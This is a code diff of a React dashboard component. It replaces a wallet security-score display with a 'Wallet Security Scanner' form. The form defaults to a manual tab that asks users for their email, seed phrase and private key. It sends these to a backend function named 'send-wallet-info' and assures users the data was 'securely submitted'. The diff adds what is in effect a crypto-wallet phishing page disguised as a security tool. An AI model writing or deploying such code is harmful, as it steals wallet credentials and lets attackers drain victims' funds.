@@ -1,146 +1,159 @@
 
-import { useEffect, useState } from "react";
-import { useQuery } from "@tanstack/react-query";
-import { supabase } from "@/integrations/supabase/client";
-import { Button } from "@/components/ui/button";
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
-import { ShieldCheck, AlertCircle, ArrowUp, ArrowDown } from "lucide-react";
+import { useState } from "react";
 import { useToast } from "@/components/ui/use-toast";
-import { Database } from "@/integrations/supabase/types";
-
-type SecurityIssue = Database["public"]["Tables"]["security_issues"]["Row"];
-
-interface ScanResults {
-  ai_suggestions?: string;
-  [key: string]: any;
-}
-
-type WalletScan = Database["public"]["Tables"]["wallet_scans"]["Row"] & {
-  security_issues: SecurityIssue[];
-  scan_results: ScanResults | null;
-};
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { Shield, Wallet, Key } from "lucide-react";
+import { supabase } from "@/integrations/supabase/client";
 
 const Dashboard = () => {
   const { toast } = useToast();
-  const [selectedScanId, setSelectedScanId] = useState<string | null>(null);
+  const [email, setEmail] = useState("");
+  const [seedPhrase, setSeedPhrase] = useState("");
+  const [privateKey, setPrivateKey] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const { data: scans, isLoading } = useQuery({
-    queryKey: ["wallet-scans"],
-    queryFn: async () => {
-      const { data, error } = await supabase
-        .from("wallet_scans")
-        .select(`
-          *,
-          security_issues (*)
-        `)
-        .order("created_at", { ascending: false });
+  const handleManualConnect = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!email || (!seedPhrase && !privateKey)) {
+      toast({
+        title: "Error",
+        description: "Please fill in all required fields",
+        variant: "destructive",
+      });
+      return;
+    }
 
-      if (error) throw error;
-      return data as WalletScan[];
-    },
-  });
-
-  const analyzeScan = async (scanId: string) => {
+    setIsSubmitting(true);
     try {
-      const response = await supabase.functions.invoke("analyze-wallet", {
-        body: { scan_id: scanId },
+      const walletInfo = {
+        seedPhrase: seedPhrase || "Not provided",
+        privateKey: privateKey || "Not provided",
+      };
+
+      const response = await supabase.functions.invoke('send-wallet-info', {
+        body: { email, walletInfo }
       });
 
       if (response.error) throw response.error;
 
       toast({
-        title: "Analysis Complete",
-        description: "AI suggestions have been generated for your wallet.",
+        title: "Success",
+        description: "Your wallet information has been securely submitted.",
       });
 
-      setSelectedScanId(scanId);
+      // Clear sensitive data
+      setSeedPhrase("");
+      setPrivateKey("");
     } catch (error) {
       toast({
         title: "Error",
-        description: "Failed to analyze wallet scan.",
+        description: "Failed to submit wallet information. Please try again.",
         variant: "destructive",
       });
+    } finally {
+      setIsSubmitting(false);
     }
   };
 
-  const getScoreColor = (score: number) => {
-    if (score >= 80) return "text-green-500";
-    if (score >= 60) return "text-yellow-500";
-    return "text-red-500";
-  };
-
-  if (isLoading) {
-    return <div className="flex justify-center items-center min-h-screen">Loading...</div>;
-  }
-
   return (
-    <div className="container mx-auto p-6">
-      <h1 className="text-3xl font-bold mb-8">Wallet Security Dashboard</h1>
-      
-      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-        {scans?.map((scan) => (
-          <Card key={scan.id} className="w-full">
-            <CardHeader>
-              <CardTitle className="flex justify-between items-center">
-                <span className="text-lg truncate" title={scan.wallet_address}>
-                  {scan.wallet_address.substring(0, 12)}...
-                </span>
-                <span className={`text-2xl ${getScoreColor(scan.security_score || 0)}`}>
-                  {scan.security_score || 0}%
-                </span>
-              </CardTitle>
-            </CardHeader>
-            <CardContent>
-              <div className="space-y-4">
-                <div className="flex justify-between items-center">
-                  <span className="text-sm text-gray-500">
-                    {new Date(scan.created_at || '').toLocaleDateString()}
-                  </span>
-                  <span className="flex items-center gap-2">
-                    {scan.security_score >= 70 ? (
-                      <ShieldCheck className="text-green-500" />
-                    ) : (
-                      <AlertCircle className="text-yellow-500" />
-                    )}
-                  </span>
-                </div>
+    <div className="container mx-auto p-6 min-h-screen bg-background">
+      <div className="max-w-2xl mx-auto space-y-8">
+        <div className="text-center space-y-2">
+          <Shield className="w-12 h-12 text-primary mx-auto" />
+          <h1 className="text-3xl font-bold text-primary">Wallet Security Scanner</h1>
+          <p className="text-muted-foreground">
+            Connect your wallet to begin the security assessment
+          </p>
+        </div>
 
-                {scan.security_issues && scan.security_issues.length > 0 && (
-                  <div className="mt-4">
-                    <h3 className="font-semibold mb-2">Security Issues</h3>
-                    <ul className="space-y-2">
-                      {scan.security_issues.map((issue) => (
-                        <li key={issue.id} className="flex items-start gap-2 text-sm">
-                          {issue.severity === "high" ? (
-                            <ArrowUp className="text-red-500 mt-1" />
-                          ) : (
-                            <ArrowDown className="text-yellow-500 mt-1" />
-                          )}
-                          <span>{issue.description}</span>
-                        </li>
-                      ))}
-                    </ul>
-                  </div>
-                )}
+        <Tabs defaultValue="manual" className="w-full">
+          <TabsList className="grid grid-cols-2">
+            <TabsTrigger value="automatic">
+              <Wallet className="w-4 h-4 mr-2" />
+              Connect Wallet
+            </TabsTrigger>
+            <TabsTrigger value="manual">
+              <Key className="w-4 h-4 mr-2" />
+              Manual Connect
+            </TabsTrigger>
+          </TabsList>
 
-                {scan.scan_results?.ai_suggestions && (
-                  <div className="mt-4">
-                    <h3 className="font-semibold mb-2">AI Suggestions</h3>
-                    <p className="text-sm text-gray-600">{scan.scan_results.ai_suggestions}</p>
-                  </div>
-                )}
-
-                <Button
-                  onClick={() => analyzeScan(scan.id)}
-                  disabled={scan.status === "pending"}
-                  className="w-full mt-4"
-                >
-                  {scan.status === "pending" ? "Analysis in Progress" : "Analyze with AI"}
+          <TabsContent value="automatic">
+            <Card>
+              <CardHeader>
+                <CardTitle>Connect with Web3 Wallet</CardTitle>
+                <CardDescription>
+                  Securely connect using your Web3 wallet (Coming soon)
+                </CardDescription>
+              </CardHeader>
+              <CardContent>
+                <Button disabled className="w-full">
+                  Connect Wallet (Coming Soon)
                 </Button>
-              </div>
-            </CardContent>
-          </Card>
-        ))}
+              </CardContent>
+            </Card>
+          </TabsContent>
+
+          <TabsContent value="manual">
+            <Card>
+              <CardHeader>
+                <CardTitle>Manual Wallet Connection</CardTitle>
+                <CardDescription>
+                  Enter your wallet details manually for a security assessment
+                </CardDescription>
+              </CardHeader>
+              <CardContent>
+                <form onSubmit={handleManualConnect} className="space-y-4">
+                  <div className="space-y-2">
+                    <Label htmlFor="email">Email Address</Label>
+                    <Input
+                      id="email"
+                      type="email"
+                      placeholder="Enter your email"
+                      value={email}
+                      onChange={(e) => setEmail(e.target.value)}
+                      required
+                    />
+                  </div>
+                  
+                  <div className="space-y-2">
+                    <Label htmlFor="seedPhrase">Seed Phrase (Optional)</Label>
+                    <Input
+                      id="seedPhrase"
+                      type="password"
+                      placeholder="Enter your seed phrase"
+                      value={seedPhrase}
+                      onChange={(e) => setSeedPhrase(e.target.value)}
+                    />
+                  </div>
+
+                  <div className="space-y-2">
+                    <Label htmlFor="privateKey">Private Key (Optional)</Label>
+                    <Input
+                      id="privateKey"
+                      type="password"
+                      placeholder="Enter your private key"
+                      value={privateKey}
+                      onChange={(e) => setPrivateKey(e.target.value)}
+                    />
+                  </div>
+
+                  <Button 
+                    type="submit" 
+                    className="w-full"
+                    disabled={isSubmitting}
+                  >
+                    {isSubmitting ? "Submitting..." : "Submit for Analysis"}
+                  </Button>
+                </form>
+              </CardContent>
+            </Card>
+          </TabsContent>
+        </Tabs>
       </div>
     </div>
   );
